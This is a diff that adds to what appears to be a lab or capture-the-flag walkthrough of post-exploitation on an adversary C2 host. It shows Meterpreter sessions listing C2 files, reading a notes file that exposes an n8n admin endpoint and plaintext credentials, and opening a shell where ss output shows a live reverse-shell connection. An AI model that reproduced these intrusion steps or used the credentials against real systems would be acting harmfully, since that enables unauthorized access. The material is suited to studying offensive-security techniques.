@@ -1684,3 +1684,54 @@ stdout_logfile=/var/log/adv-c2/sshd.log
 stderr_logfile=/var/log/adv-c2/sshd.err.log
 
 ```
+##### meterpreter > ls -la /opt/c2/
+```
+meterpreter > ls -la /opt/c2/
+Listing: /opt/c2/
+=================
+
+Mode              Size  Type  Last modified              Name
+----              ----  ----  -------------              ----
+100664/rw-rw-r--  123   fil   2026-06-07 23:27:45 -0400  adversary_notes.txt
+100664/rw-rw-r--  4713  fil   2026-06-07 23:27:45 -0400  app.py
+100664/rw-rw-r--  207   fil   2026-06-09 12:57:33 -0400  config.yaml
+100664/rw-rw-r--  5666  fil   2026-06-07 23:27:45 -0400  drain.py
+100664/rw-rw-r--  67    fil   2026-06-07 23:27:45 -0400  requirements.txt
+```
+##### meterpreter > cat /opt/c2/adversary_notes.txt
+```             
+meterpreter > cat /opt/c2/adversary_notes.txt 
+adv-n8n admin endpoint: http://20.30.40.153:5678
+adv-n8n admin username: adv_operator
+adv-n8n admin password: operator!n8n
+```
+
+
+
+ss -tulpan
+```
+meterpreter > shell
+Process 6154 created.
+Channel 6 created.
+ss -tulpan
+Netid State     Recv-Q Send-Q Local Address:Port  Peer Address:Port Process                                                                 
+udp   UNCONN    0      0         127.0.0.11:35337      0.0.0.0:*                                                                            
+tcp   LISTEN    0      511          0.0.0.0:8080       0.0.0.0:*                                                                            
+tcp   LISTEN    0      2048       127.0.0.1:9000       0.0.0.0:*                                                                            
+tcp   LISTEN    0      2048       127.0.0.1:9001       0.0.0.0:*                                                                            
+tcp   LISTEN    0      4096      127.0.0.11:46501      0.0.0.0:*                                                                            
+tcp   LISTEN    0      128          0.0.0.0:2222       0.0.0.0:*                                                                            
+tcp   TIME-WAIT 0      0          127.0.0.1:34560    127.0.0.1:9000                                                                         
+tcp   TIME-WAIT 0      0       20.30.40.160:40772 20.30.40.161:5432                                                                         
+tcp   TIME-WAIT 0      0          127.0.0.1:9000     127.0.0.1:45442                                                                        
+tcp   TIME-WAIT 0      0          127.0.0.1:33964    127.0.0.1:8080                                                                         
+tcp   TIME-WAIT 0      0          127.0.0.1:35872    127.0.0.1:8080                                                                         
+tcp   ESTAB     0      0       20.30.40.160:56276  30.40.50.10:1111                                                                         
+tcp   ESTAB     0      0       20.30.40.160:2222   30.40.50.10:35910                                                                        
+tcp   TIME-WAIT 0      0          127.0.0.1:48416    127.0.0.1:9000                                                                         
+tcp   TIME-WAIT 0      0       20.30.40.160:54376 20.30.40.161:5432                                                                         
+tcp   TIME-WAIT 0      0          127.0.0.1:46356    127.0.0.1:8080                                                                         
+tcp   TIME-WAIT 0      0          127.0.0.1:54892    127.0.0.1:9000                                                                         
+tcp   ESTAB     0      0       20.30.40.160:35236  30.40.50.10:1111  users:(("ss",pid=6155,fd=3),("sh",pid=6154,fd=3),("rev",pid=4780,fd=3))
+tcp   TIME-WAIT 0      0          127.0.0.1:54324    127.0.0.1:8080                                                                         
+tcp   LISTEN    0      128             [::]:2222          [::]:* 
